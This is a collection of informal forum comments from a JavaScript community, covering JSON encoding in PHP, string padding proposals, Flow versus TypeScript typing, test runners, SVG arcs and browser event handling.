Seriously. Create a standard that almost no non-library javascript meets, then get annoyed when websites don't meet it? Way to shoot yourself in the foot. 
Do it!! w00t!!
Why? If you really want a lightweight runner, most people seem to like tape, and otherwise there's absolutely nothing wrong with mocha or any of the other test runners.
Glad it's working!
Whoop, just realized something: replace only gets the first instance it finds, so we'll want to use `str.replace(/"/g, '')` to match with all the double quotes. Lets take a minute to establish the difference between strings and objects. You're getting a string from php - meaning its just a series of characters. You want to pass an object to cal.setData - meaning an actual javascript {} object. To convert a string into an object, we call `JSON.parse(str)` (or `jQuery.parseJSON(str)`). That function returns an object, but only if the string is correctly formatted. The string you're receiving has extra double quotes in it, making it incorrect. Therefore, we need to remove those quotes, parse the string into an object, and pass it to cal.setData. This looks something like this: var obj = JSON.parse(response.replace(/"/g, '').replace(/'/g, '"')) cal.setData(obj) Hope that makes sense :D EDIT: Just realized JSON doesn't support single-quote strings, so we'll need to add `.replace(/'/g, '"')` to the end of the other replace. Sorry if this is getting complex!
I see, thanks for the clarification. Two questions then, since I can't tell from the readme: 1. Does it only show top-level dependencies, or resolve them recursively? I've had at least one problem where a dependency's dependency iterated and broke the dependency, yet the dependency itself did not update. (doing this behind a flag or with a depth limit like `npm ls` would be fine) 2. Is there any way to filter to show, for example, only items which are not a perfect match?
Yeah, Shrinkpack is probably more about consistent dependency installs and offline installs, but there's overlap. I've posted the link to Shrinkpack in a number of threads in various places, and several people have made comments to the effect of "repo size" and such. Maybe it is that there's some use case I'm missing, but I completely don't understand those concerns. If you look at articles discussing the "how do I handle consistent / offline dependencies with NPM?" issue, the general suggestions offered usually involve either committing the entirety of your `node_modules` folder as-is, zipping up all of `node_modules` and committing that, or using a private NPM server (which I believe is what Sinopia is). Obviously, there are multiple problems with checking in all of `node_modules`. Size and number of files are both gonna be huge (easily upwards of 25K files and 150MB, depending on packages), as well as volatility any time you upgrade dependencies. Also, NPM package installs often include platform-specific build outputs (like, say, `node-sass`'s binaries), which kills the possibility of sharing those checked-in files cross-platform. I can see that a private NPM server would be useful if you're in an organization that has the infrastructure to run one, but that doesn't help lots of other projects. On the other hand, with Shrinkpack, you check in the tarballs themselves. The files are smaller, because they're gzipped; there's only one file per dependency, instead of potentially hundreds or thousands extracted on disk; and since native code stuff only gets built after installation, I could check out a project on different platforms, run `npm install`, and get the right pieces built on both sides. I also don't get the "repo size" argument. Is everybody in the JS community expecting that a repo will only ever be a few K of pure source? We've got a project at work that's got several Java and Python sub-modules, and we've had to upgrade numerous libs over time. The repo is up over a gig at this point, but still going. Granted, we're not exactly having to re-clone it on an ongoing basis, but still. In contrast, the `node_shrinkwrap` folder for my current prototype is currently at 35.2MB and 825 files, and the fast majority of that is from three dependencies: the Cesium 3D globe (15.6MB), Semantic-UI (2.5MB), and Sinon (1.2MB). So, that's a whopping 16MB for the remaining 822 dependencies. Is that really something to be concerned about? Is there some cultural aspect about repository sizes that I'm missing here?
Great suggestion. I'll get that added in for others. Thanks!
WOW. just WOW. it's been 2 days i'm wondering what i'm doing wrong. I'm not a programmar, i'm a 3rd year student of medicine and chirurgy and i just program for fun and love. Really thank you, i wish i can ask you more if i have more trouble. 
whichever assertion library you're using most likely has a `throws` assertion this assertion expects a function declaration that would throw an error. the assertion will call that function and get the error. so you could have: var errFunc = function(x, y, callback){ callback(new Error(expected)); }; assert.throws(errFunc, /testError/, 'callback throws error'); but that really only tests the callback actually throws the error you're looking for. i think you could do something like: doSomething = sinon.stub(lib, 'doSomething', errFunc); assert.throws(lib.doSomething, /testError/ , 'throws error');
Search for the onEdit() function It let's you do certain things to an updated cell
thats wrong. var response=JSON.parse(response) // &lt;--- alert(response) //step 3 verify the data is in the right format for setData() //or transform response=transformDataForCal(response) // &lt;--- cal.setData(response) you might have to format the data before sending it to setData without seeing the code/api i dunno. gl! note: the data has to be encoded from php's `json_encode()` first
this is what i'd actually prefer. chrome's devtools are by far the best.
Jurassic Park was on TV when I was coding, and it's got some good lines, so...
That worked :) Thank you so much. Very last question which I think should be quick. function getUrlParameter(sParam) { var sPageURL = window.location.search.substring(1); var sURLVariables = sPageURL.split('&amp;'); for (var i = 0; i &lt; sURLVariables.length; i++) { var sParameterName = sURLVariables[i].split('='); if (sParameterName[0] == sParam) { return sParameterName[1]; } } } var demo = decodeURIComponent(getUrlParameter('demo')); document.getElementById('demo').innerHTML = demo; document.getElementById('demo1').innerHTML = demo; document.getElementById('demo2').innerHTML = demo; document.getElementById('demo3').innerHTML = demo; I'm noticing that if my parameter has a '+' sign in it, that it display in text with a '+' sign. So I'd like to remove the '+' and make it a ' '.(space) I was thinking something like this could work: var demo = decodeURIComponent(getUrlParameter('demo').replace(/â€Œâ€‹\+/g, " ")); Thoughts?
Hey, 1. I wanted to make a file that didn't have any external dependencies, any site regardless of technology should be able to pull it in and consume it. 2. I added some script commands in the projects package.json, one for each of the webpack configs and then one that runs both. Does this help?
Keep in mind that What you get from $.ajax isn't exactly a promise, but it's similar. The Promise API is well defined in ES6 following a standard known as [A+](https://promisesaplus.com/). There are other libraries out there like [bluebird](http://bluebirdjs.com/docs/why-promises.html) are similar that do more than the basics and have been doing so before ES6 was finalized. What jquery uses is something similar, but not the same, using [Deferreds](https://api.jquery.com/jquery.deferred/). The same basic premise applies. You have a thing that would normally accept a callback to let you know when its done, and instead it returns an object and its to that object you give your callback to know when the thing is done. The advantage is that you can pass this object around and do things with it until you really need to get that value. Additionally, you can chain these callback calls (like `.done()` or `.then()` in promises) to have multiple callbacks, something which becomes useful when you have multiple, sequential requests. There are a number of intricacies around how this all works that makes them confusing beyond their simplest use cases, but thats the short and sweet version.
whole thing $outp .= json_encode(array( date(...) =&gt; [ 'content' =&gt; $foo, 'url' =&gt; $bar, 'allDay' =&gt; true] )); // outputs: { '11-21-203': [{content: '...', url: '...', allDay: '...'}] } weird ass half object thing: $outp .= "'" . date(...) . ":" . json_encode([['content'=&gt;$foo,'url'=&gt;$bar, 'allDay' =&gt;true]]) ."'"; would use the first its as easy as `var foo = JSON.parse(output)` 
I don't get it either, is it really such a common pattern? Also, i think string.padding(left, right) would be more elegant, and more in line with similar methods.
Have you tried checking it with http://jsonlint.com?
I use $outp = "{"; while($rs = $result-&gt;fetch_array(MYSQLI_ASSOC)) { if ($outp != "{") {$outp .= ",";} $outp .= "'" . date("m-d-Y", $rs['str_data']) . "' : [{content: '" . $rs["occasione"] . "', url: 'prova', allDay: true}]"; } $outp .="}"; $conn-&gt;close(); echo json_encode($outp); and i get that json output http://www.ldida.altervista.org/Calendariofine/js/data.php but when that page http://www.ldida.altervista.org/Calendariofine/index2.html load the data.php file wich gives the JSON i get that error VM1481:1 Uncaught SyntaxError: Unexpected token c in JSON at position 18 I tryed with your version but still gives an error.
Because if it's not added to the API, it's usually shimmed and sent to the client, which consumes extra bandwidth. (Admittedly the extra bandwidth probably isn't that noticable for a short function like string padding but it's still better to not consume it.) Also, padding characters to a string is an extremely common operation. I think it's a good thing to have native functions for common operations like that -- it reduces the amount of spaghetti code needed to perform simple tasks. *edit: clarification*
Oh yes, that's why I put the warning. I would've suggested JSON.parse if the quotes were reversed (single quote surrounding, double quotes in object keys)
Well, this is more of an SVG than a JavaScript problem. With SVG you can create a path (with green fill and dashed stroke) using &lt;svg&gt; &lt;path d="path data here" stroke="black" stroke-dasharray="5,5" fill="green" id="myPath" /&gt; &lt;/svg&gt; Now, to create an arc we need to know the four "corner-points" of the path. This is where the mathematics come into play; yay, angles! sinuses! cosinuses! First, you need to transform the percentages to radians JavaScript can work with. Then, say the start angle is A, the end angle B, the radius R, and the thickness D. Then, the corner points (counter-clockwise) should be: point1 = (R*cos(A), R*sin(A)) point2 = ( (R-D)*cos(A), (R-D)*sin(A) ) point3 = ( (R-D)*cos(B), (R-D)*sin(B) ) point4 = (R*cos(B), R*sin(B)) To connect points with arcs we use the letter A in front of it, to connect points with straight lines we use L. Also, don't forget to put the center at (400,400) by simply adding the number 400 to both the x and y coordinate. So, the path data to put on the object becomes d="Mpoint1 Lpoint2 Apoint3 Lpoint4 Apoint1" That's it! Now, remember you can use document.getElementById("myPath").setAttribute("d", "your path data here"); to set the data attribute on our svg element. This should be more than enough information to create that function!
It looks like you might be trying to build a JSON string in PHP (at least the `.=` operator is valid in PHP but invalid in JS); if this is the case, it would be good to let us know.
I use $outp = "{"; while($rs = $result-&gt;fetch_array(MYSQLI_ASSOC)) { if ($outp != "{") {$outp .= ",";} $outp .= "'" . date("m-d-Y", $rs['str_data']) . "' : [{content: '" . $rs["occasione"] . "', url: 'prova', allDay: true}]"; } $outp .="}"; $conn-&gt;close(); echo json_encode($outp); and i get that json output http://www.ldida.altervista.org/Calendariofine/js/data.php but when that page http://www.ldida.altervista.org/Calendariofine/index2.html load the data.php file wich gives the JSON i get that error VM1481:1 Uncaught SyntaxError: Unexpected token c in JSON at position 18 
I hate this so much. I can't stand that browsers have different APIs. Browser developers think they're making everyone's life easier, when in reality, it just turns everything into a shithole.
Dang, I have recently made the switch from [underscorejs](http://underscorejs.org/) to [lodash](https://lodash.com/) and while I found the `fromPairs` array function, I had not stumbled upon `chunk`. While my OP will have less overhead than this, I've already included `lodash` into my project so I'll use your approach... thanks!
Recently we've used Ampersand, React-Router, Backbone-Router. Not Redux-Router so far. I'm still trying to find time to test Router5, which seems to be a great solution from its description. We'll see :).
But padStart and padEnd are a [stage 3 proposal](https://github.com/tc39/proposal-string-pad-start-end), so they'll probably be in the 2017 standard anyway. Chrome just got a head-start.
Try using https://jsonformatter.curiousconcept.com/ 1) You're adding double-quotes to the whole thing, which you shouldn't be doing 2) Each property and value should be wrapped in double-quotes, not single-quotes 3) You have empty lines at the bottom of your data.php file. You should get rid of them 4) I think json_encode is to convert the PHP object into a JSON string, but you're converting a PHP string into a JSON string, which doesn't work so well. You can try this instead, which basically constructs the array in PHP, then converts the whole thing to a JSON string: // initialize the object first $outp = array(); while($rs = $result-&gt;fetch_array(MYSQLI_ASSOC)) { // get the index $date = date("m-d-Y", $rs['str_data']); // create the index if it doesn't exist if (!isset($outp[$date])) { $outp[$date] = array(); } // add the content to the end of the array array_push($outp[$date], array( "content" =&gt; $rs["occasione"], "url" =&gt; "prova", "allDay" =&gt; true )); } // output as json echo json_encode($outp); You're more likely to catch errors in constructing an array than a JSON string too
Are you submitting the page, reloading it before you have a chance to see inner hit?
This honestly made me more confused about NaN.
your code give Parse error: syntax error, unexpected '[' in /membri/ldida/Calendariofine/js/data.php on line 10 wich is the line of $outp = []; 
If you are on Chrome devtools, select "Preserve Log" in the Network tab, if you use other browser, look for the equivalent option. 
It looks like you're working extra hard to create a custom-encoded string, and then run it through json_encode. That isn't how it works. Put it all in an array (or array or arrays, whatever) and then put that array in json_encode.
thank y, but still another json error VM1560:1 Uncaught SyntaxError: Unexpected number in JSON at position 1 u can check it http://www.ldida.altervista.org/Calendariofine/index2.html opening the console f12
Is weight that much of a issue? I'm not all that familiar and just started using mocha (hence the question), with over 200 tests it still runs within 20ms, and some of those use the Dom API.
I think this looks like the cause. Likely running, but you don't have a chance to see it print due to page refresh. 
Because npm.
This would make my life better. At the same time, that means Lodash can't update with the frequency that it currently does.
You're submitting the form the button is in, which refreshes the page
Sure. We know that the coordinates of all the points on a circle of radius R, can be described by R\*cos(x) and R\*sin(x) (where x is the angle, and 0 &lt;= x &lt;= 2pi). The arc essentially consists of two points on a large circle (radius R) and two points on a smaller circle (radius R-D). We can use that information to get coordinates for the four points that define the arc. See [this picture](http://imageshack.com/a/img924/615/ChRnP6.png)
Note that it probably should be: MyModule.prototype.getName = function () { ... }; You have two alternatives: .then(Thing.getName.bind(Thing)) // ES5 .then(() =&gt; Thing.getName()) // ES6 (arrow function) 
You're a god. Thank you!! Can you explain why return false fixes the problem/what it does so that it fixes the problem?
 $("#submit").click(function (e) { e.preventDefault(); alert("alert hit"); console.log("inner hit"); }); will also stop it from submitting. Look into Event Propogation, and how event bubbling works and you can learn a lot about how these events are fired, and how you can interrupt them, or interact with them as needed.
If you search for the d3 info that's available, honestly the community is overwhelmingly helpful. Tons of examples of exactly what you're looking to do. I don't have any links on me, on mobile, but I'll revisit if no one else shows up with resources 
Immutable is nice but it drastically changes the interface with the structures (largely necessary). I think better immutable support for the existing structures would be a great start. 
I had a dream last week that JavaScript had Python's standard library. I woke up and realised it was a dream and was actually really #$()$%ing pissed off for most of the morning at work. I code too much.
For a long time my biggest draw to Flow over Typescript was because strings counted as singleton types and you could do string enums as unions over a set of string singleton types: `"north" | "south"` but Typescript recently added the ability as well. Non-nullable types also falls into this category. I also prefer to not write class based Javascript and building up object literals is much easier in Flow. As a simple example, this code typechecks under Flow but not under TS: type Foo = { foo: boolean, bar: number, } function test(): Foo { let toRet = {}; toRet.foo = true; toRet.bar = 3; return toRet; } When I was evaluating them a couple months ago, I also tried to get Ramda as a way to stress the type system. I didn't get either to work and I didn't really get any sort of progress in Typescript but I got most of the way with Flow by just type annotating a few of the individual functions normally and then putting the fancy types on the curry functions. The main thing missing IIRC was that a curried function called with no arguments should return itself. More generally, the story around shared typings for library code has always been much better in the TS community. I've always had to write my own typings for the libraries I'm using and I tend to just do the bits I'm using so I don't really want to share them. The other advantage for the larger TS community is more/better plugins for editors. My experience with working on both on ~5k LoC codebases is that flow provides noticeably faster type query completions. I've ran into one person on reddit who switched from Flow to TS. He mentioned flow analysis errors (I never ran into any) and that TS performs noticeably better than Babel as a traspiler (haven't run into the problem). I tend to write mostly clojurescript these days so I'm not using either day to day. I'd pick flow for my personal projects since I prefer the type system but I'd probably suggest Typescript at work due to the network effects.
I'd love it if JavaScript got a proper string formatter like sprintf or python's str.format(). That'd remove the need for most of these specialized padding functions too.
FYI, all of your links and comments are being sent to the spam filter because of the domain you're using, `altervista.org`. I've approved all of the ones in this post, but since this is a manual process, we may not see it the next time. I would highly suggest that you use a different website to host your content if you'd like to share it here. Thanks!
That's concatenation, not padding. 
They both do basically the same deal but I much prefer writing in a Promise-like style rather than adding a success method to the ajax call. It's just more elegant in my mind, since I'm separating out the callbacks from the options. And also it mimics actual Promises, so you're setting yourself up for slightly less code to change later on when jQuery inevitably switches out deferreds for promises.
You've already called a in your conditional, hope you don't have a bad result from calling it again.
There's a special place in Hell for people who abuse ternaries like that. This is an example of writing horrible code because it's TOO damn clever. Also, I apologize because my comment will not help your current situation. 
I'm assuming this is minified code, because if anyone actually wrote this by hand they have serious mental issues. A more or less literal translation would look like if(109 !== e.keyCode &amp;&amp; 189 !== e.keyCode || "Lab" !== type || "L" === mode || cursorRange(this).start) { if((e.shiftKey || 48 &gt; e.keyCode || 57 &lt; e.keyCode) &amp;&amp; (96 &gt; e.keyCode || 105 &lt; e.keyCode)) { e.preventDefault(); proceedToKeyUpEvent = false; } } else { e.preventDefault(); proceedToKeyUpEvent = false; } The thing you need to know here is that the logical operators are short-circuiting. Assuming you're not using it as part of a larger expression, then `a &amp;&amp; b` is roughly equivalent to `if(a) { b; }`. In such a case, evaluating `b` ought to have some kind of side effect, as the value it yields is discarded. In the example above, `b` uses the comma operator to evaluate two expressions. 
&gt;and instead of trying to change the language, it augments it. Is this implying that typescript *is* trying to change the language? How? They have the same goal, with almost the same syntax. 
Typescript syntax is not a superset of javascript. Typescript can look very different from javascript/flow
Typescript ... *is* a superset of javascript, though. Do you have some examples to illustrate what you might mean?
What I'm saying is you are doing "a" twice in your regular if statement. BTW, the "short if" is called a ternary operator.
Basically they're just (don't know the exact term) ways to call functions in a multi-threaded manner, yes? And since obviously the first call is faster, it completes before the second. What other things like ready behave this way?
&gt; Don Normanâ€™s The Design of Everyday Things teaches that thereâ€™s no such thing as â€œuser errorâ€ â€” humans always make mistakes, and the failure to deal with these is on the product, not the user. How would we approach these user errors if we looked at them as design failures? Don't think this necessarily applies to developers. We aren't users using a finished product. We are crafters using tools. Have to know how to use the tools.
In your javascript, you need to replace var obj = JSON.parse(response.replace(/"/g, '').replace(/'/g, '"')) with var obj = JSON.parse(response); I'm not sure why you're getting rid of the quotes, but valid JSON needs double-quotes
Angular, n. Snark magnet. 
So I have a question, since with angular 1 you don't really need to know javascript to work with it does that mean that in angular 2 you don't really need to know typescript either?
You see in the image a red x2 on your top right? that means you have two errors. Click on the console tab to see the errors.
I'm being sarcastic :-D But it seems to me that angular 1 is more configuration than coding. 
Is it? I think I saw it on some MDN docs. 
Do this, right click over the script, and click open, if you see the source code, it's loaded (in the sources tab of the chrome dev tools)
Ah, you got me
&gt; Your example is kind of a weird one to use against typescript, since it's ensuring you're not creating an illegal state for the object. The Flow type system verifies that the object is legal any point where it's used. Virtually every TS codebase I've run across is classes instead of structural types and object literals. My personal experience with this is that I find the annoyance of having to type annotate the initial assignment and then overwrite the placeholder values causes me to consider classes in a lot more places than I otherwise would.
Try `assertit` or directly `testit` if you need nesting and such things. If you target browser, then yes, mocha is still a thing because of that. Or maybe `prova`. But in anyway, try to not write nested tests, separate the things. Before one year and more I also believed that I need nesting, but really we don't need. With `mukla` we just don't care the order of the tests and the output, it is fail-first, so if there's error you'll see 2 or 3 meaningful lines. You don't need more. Or in most of the time. I'm using nodejs assert module from years and in 99.96% of the time i use `strictEqual` so..
&gt;The Flow type system verifies that the object is legal any point where it's used. Well, that's a contradiction, then. Your example is creating an illegal state of the type `Foo` and turning it into a legal state over 3 statements. If you represent it legally in typescript, or properly modify the type to account for your illegal state, the errors will go away. It's actually very surprising to me that flow *doesn't* do this, given its ML heritage. &gt;Virtually every TS codebase I've run across is classes instead of structural types and object literals I agree that typescript projects by and large tend to be classful, but that's not relevant to your example. 
Not really. These are stage 3 proposals, so a polyfill that alters the string prototype are acceptable (though altering a built in prototype for anything else is VERY bad of course). So you'll have to use a polyfill anyway, but now on Chrome you'll get native performance for these methods. And as more browsers add it in, those browsers will get native performance for them as well.
&gt; Your example is creating an illegal state of the type Foo and turning it into a legal state over 3 statements. There's nothing illegal about it, though I should have mentioned used as a `Foo` instead of just used. At the time it's checked (the return) it's a valid Foo. The ability to do this was a deliberate design decision by the Flow team. If I were to `let x: Foo = {}` I'd get a type error because I'm making the assertion at that point. If I attempt to use `x` in something that required a `Foo` before completing the construction I'd also get an error. It's extremely useful when typing existing js codebases or building up an object via a set of function calls. Edits for clarity 4m after post.
Yeh I used to be a huge fan of Firebug but Chrome's dev tools have evolved A LOT. They're very nice today.
Its just a utility function, for when you actually need to pad a string =)
It looks like you're outputting `content` as an unquoted object key, and all keys (in fact, all *strings*) in JSON need to be quoted, with double-quotes.
"Enable javascript.options.shared_memory in about:config, then reload this page."
Not sure who wrote up the problem, but that type of graphic was most likely drawn with software like Adobe Illustrator which can output SVG graphics that will handle all of the math for you and is compatible with HTML, and selectable with Javascript.
Thanks a lot! I still need some time to understand this. But basically mocha itself can use babel without webpack as long as I config it with mocha.opt right? And you suggest jsdom.js for react component tests. With this approach I wont be able to do my testing in browser right? Everything will be command-line. . Is there an advantage/disadvantage from your method vs what this guy is doing: https://github.com/robertknight/react-testing/blob/master/webpack.config.js Cause before you explained to me I thought the webpack way was the only way. I've just started looking seriously into testing framework sorry for the ignorances. Thanks again for the great details
Probably didn't use @ because of the decorator proposal. Don't know what stage it's at, haven't been paying attention
I honestly heard of the `padStart` proposal (back when it was known as `padLeft`) well before the `leftpad` module, and the es7-shim prollyfill for `padStart` is much more performant, as I repeatedly pointed out during the `leftpad` crisis.
Damn this is cool
Maybe he meant execution time, because the shimmed method does need to be re-constructed on every page refresh, because there's no way for a page to add functionality to the JS runtime so it just remains available.
I disagree. Development tools, even those on the CLI, have a UI. Sure, some training may be required, but it should behave the way you expect it too, or at least, not misbehave.
Honestly... I think this is an oversimplification. I maintain a few OSS projects. Some of them (particularly one) is fairly active. I can say from firsthand experience that what one person "expects" in terms of behavior and interface often directly contradicts what another person expects. You can't please everyone. Sometimes when things go wrong- it's the fault of the tool creator or their documentation. Sometimes when things go wrong- _it's user error_. I don't even think that's debatable.
&gt; this code typechecks under Flow but not under TS: Care to elaborate what exactly `typecheck` means here? This looks like completely valid JS code with not a single type violation. I am missing something? 
Yup and how does an API like `string.padding(left, right)` accomplish padding when there is no parameter for count...? The only logical thing the `string.padding(left, right)` implementation could do is concatenate them. If /u/Graftak9000 meant a count could be passed, he/she should have said so.
I read the proposal, and it looks like it's not astral-plane safe (that is, it may leave a high surrogate by itself), and instead it expects a typical use case of padding with ASCII characters; I believe it is slightly combining-mark safe, because the repeated fill-string is truncated from the right (for both `padStart` and `padEnd`), so any combining marks would be removed before the characters they were intended to be used on are. Also TIL these methods were added in Firefox 48 too.
Sure, your call. 
In typescript it would compile with a type error, hence it doesn't "type check". Because no annotations are used in the example, typescript infers `toRet` to be of type `object`. `object` does not have the properties `foo` or `bar`, so the assignments don't type check, and it errors. Flow appears to be specifically designed to enable this.
It looks like that github remo is demonstrating a couple of different ways in which you can run tests. The first way is to use webpack to bundle your test files into a single file that can run on the browser. It looks like his webpack configuration saves that bundle into the `dist/`, and you can run the tests by opening `index.html` in your browser. The second way you can run your tests is by running mocha on the command line, and configuring it to use JSDom so the browser isn't needed. In this repo, `tests/setup.js` is pretty much the same JSDom configuration that I posted, so it looks like the author is demonstrating this as well. I described the second method in my post. I use this along with setting up IntelliJ to run my tests when I press `shift`+`f10`, which makes it really easy to test-drive my code. Either method works though. You can use babel with both methods. One uses `babel-loader` through webpack, and the other uses `babel-register`with mocha. If you look in my original post, you'll see that my examples were in ES6 :)
Personally, I am in favor of anything that helps make programs easier to reason about and I think types are a good way to tell the next person what you intended. The biggest problems I have with typescript are: 1) I feel like people who rely on typescript want to also write classical OO programs in Javascript which leads to misunderstanding the language 2) much like in Scala, typescript suffers from type erasure, i.e. the types are enforced at compile time, but they are lost so the types go unenforced in running programs. Which defeats some of the benefit you get from types. My team has been using my type library signet to actually enforce types throughout our system which had been working out pretty well. https://www.npmjs.com/package/signet The thing we get is a mixture of predicate-backed types, strong type polymorphism and good support of functional programming. It can be used with languages like typescript, so you can actually improve your code in place. 
It's just part of how event handlers work: If the event-handler function returns `false` (not just a falsy value, the specific boolean value `false`), then the default action of the event is cancelled and propagation is stopped. This convention is also followed by event listeners (attached with `addEventListener` rather than `onclick` and the like), but the event object that gets passed in as the first argument has two separate methods called `preventDefault` and `stopPropagation` to specify those things separately, and without needing to return. --- For the oldIE-style event listeners (attached with `attachEvent`), the event object is a global variable called `event` and it has, respectively, a `returnValue` property that cancels the default action if set to `false`, and a `cancelBubble` method, so-named because oldIE only supports the bubbling phase of event propagation, not the capturing phase. I hope you won't need to work with IE8 and earlier.
&gt; It would have, ironically, worked much better if you were lazier, and used less annotations It's a style thing on my part but I strongly prefer writing explicit annotations as part of the function signature. It reduces the chance at a code change affecting some other part of the system unexpectedly.
Happy to help, feel free to shoot me a PM if you have any other questions.
I believe this would have still worked function test(): Foo { let foo = true; let bar = 3; return { foo, bar }; } Since the type returned is compatible with `Foo`. The problem as far as typescript is concerned is the mutation on empty object.
Ya, user error exists, but that doesn't mean we can't reduce it through well thought out design. 
Is there a use case for obfusication past the name mangling that occurs during bundling and minification?
That is old one . fb changed the license after public outcry. new license &gt;Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: &gt; * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. &gt; * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. &gt; * Neither the name Facebook nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. &gt;THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 
No, it only circumvents the result if your browser supports the `rel` attribute's content.
This is cool, but I'm afraid all the JS devs I know that are barely holding their head above the water as it is would completely drown if they'll have to enter a codebase where thread safety is suddenly an issue.
Yes, and I think there's not even a single mention of this in ES2017.
Not trying to be pedantic here, but you're saying something very different now than before. Of course we should aim to reduce errors through design. I think all OSS maintainers try to do this too! But you'll never make something that acts the way _everyone_ expects it to. There's also another important factor to consider. Most of us working on OSS are doing it in our spare time, for free. So how much of our effort we _can_ invest in making things easier has to be up to project maintainers. Put another way, I think it's impossible to please 100% of people. Maybe it's possible to please 80% but if you worked twice as long you could increase that to 85%. Should you do that then? Impossible to say. Depends on too many factors.
It is not better but rather a other way of doing it. If it's a right way or wrong one, only time will tell us. As far as I am concerned, it's a good proof of concept, but nothing that could be put into a production.
Sounds exciting. It would be nice if it displayed ours FPS though. Since we're talking about all this *cool-stuff*, anyone knows how stuff like this is called: [1,2,3,4] + [10,10,10,10] = [11,12,13,14] From what I remember acronym is 4 letters and starts with **M**. This is second time I'm stuck at finding such simple stuff... 
I think you're looking for [Single Instruction, Multiple Data](https://en.wikipedia.org/wiki/SIMD). [(MDN page)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SIMD)
Goddamnit.
Yeah,that's it. thanks!
The last point you make is really important to me, and is what makes Flow "better" for me right now. When TS gets this capability in its released version (I've been monitoring the github issues for a while) I'll probably re-evaluate, as the TS ecosystem as a whole is much richer in terms of supported libs and good editor support.
I'm getting the same message. Is there any good reason why I *shouldn't* enable it?
"protecting your code" 
Most likely, you'll end up with libraries/modules that expose a main-thread interface only, but use parallelism under the hood when available. The average web monkey won't need to know about it to benefit from it.
I have looked it up on MDN (https://developer.mozilla.org/nl/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer) and it seems to be a Firefox only feature. I use Opera, so tough luck.
True. No matter the programming language, if you're using threads, you're probably doing something wrong. Threads are super difficult to get right, and best left to the library designers to handle.
Not 100% sure, but seems like a spam mail system of some kind?
&gt; You can't blame node for the bad code the community writes. I think you can; I think Javascript is a very difficult language to write correct code in, when you combine out-of-order execution for any action that hits the filesystem, funky behavior for core types, lack of some very useful core primitives, and multiple different methods for handling errors. Like, if there's a law in one country that says everyone has to wear a gun, and the incidence of people accidentally blowing their foot off is really high, you can say "it's not the law's fault there are careless people" but maybe that's not right? &gt; I don't know if people understand that 0.x means unstable. I've found this to be a useless signal of software quality; I think I read somewhere that 86% of packages are on version 0. Many packages that are version 1 or higher are broken. &gt; Don't complain about free, libre, unstable software if it's totally outdated. Should we never say anything bad about our experiences with free software that's in wide use? My goal in writing the article was to say "we run Node in production; it's been really frustrating; here are some problems we've had; it would be really nice if there was some progress made here." How am I supposed to give that feedback if I don't describe what happened that was bad? How are potential users supposed to make a decision about which framework/language/libraries to use in the absence of feedback, besides deploying it to production and seeing what happens? FWIW, I think it's perfectly legitimate to complain about outdated software, if the maintainers are roughly the same. It goes to the quality of the team, the library, and the code they have written and are likely to write. I believe everyone who's still getting owned by insecure versions of Mongo would also have opinions about this. &gt; Do you have a 1:1 proof and example that others can try out? I mean, the article pretty much proofs nothing if you have a while(true &amp;&amp; Date.now &lt; sometime) { require('stuff'); } is running. here's one showing the useless work your machine is doing: https://github.com/nodejs/node/pull/1920. "From my tests with a whole process doing only require('express'), I pass from 760 stat64 to 574 (-25%) and from 106 open_nocancel to 58 (45%)." I can also add print lines before and after the `require` lines only in my system tests/boot scripts, and observe like a 10 second difference in the timestamps (locally, on my powerful MBP) &gt; I'm stating that because my build system requires 20k+ files with several dozens MB of code, and it builds in under 2 seconds. I'd be interested to know how you think GC is related, or could help... open to any ideas, but I have not seen anywhere near that performance. our app loads about 3k files (successfully) and many more unsuccessful stat() syscalls. &gt; I can totally recommend sequelize where you can do transactions. I can totally recommend that library, never had problems with it. We are a small team, supporting a large company, we have over 100kLOC and probably around 1000 individual call sites that directly integrate with our ORM across tests and app code. We also have built a fair amount of custom validation logic into our ORM, including indexes which only hit on the `LOWER()` version of the string (a very unfortunate Waterline requirement.) Unfortunately, porting that code to a different ORM is not a small undertaking. &gt; node-inspector and Heap snapshots for the ultimate win. Also, nulling for GC is pretty effective if you still want to produce garbage. We can't take a heap dump, because it requires 2x the amount of memory that's currently in use; by the time the machine starts swapping it's already out of memory. I'm not optimistic about my chances of reproducing this locally.
Quite hard to tell. Looks almost like some of these functions are plain useless. Not to mention entire strings made of unicode escape sequences. What makes you think it's a spam bot? I'd like to hear your thoughts
Surprisingly, no mention of code minifiers like uglify which can easily combine statements and remove dead code, i.e., optimize your code.
Can i ask in what context you would use a function like pad start or pad end? I'm still struggling for any practical use for it
Making a lot of strings the same length. I use it every time I make a cli app. 
This will also remove every ' and " in the content. Not that i would recommand that, but you probably would change the regex to` /^"|"$/g`.
Why is there a requirement to make strings all the same length?
* If you have two dollar amounts in a fixed width display (think command line or LCD hardware) on different lines, and need the cents to align * heck, any time you want to align lines in a fixed-width font environment * If you have to display a ZIP code stored as a number (e.g. 123 should be padded to 00123)
Not a requirement, it just looks nicer. See [here](https://github.com/seiyria/steam-avg-pct-cli#sample-output)
We've become too comfortable with webpack and there are too many examples and starter kits, let us begin the exodus 
Awesome let's give the 12 year olds with ADD access to threads, I'm sure that's what the web has been missing. smh
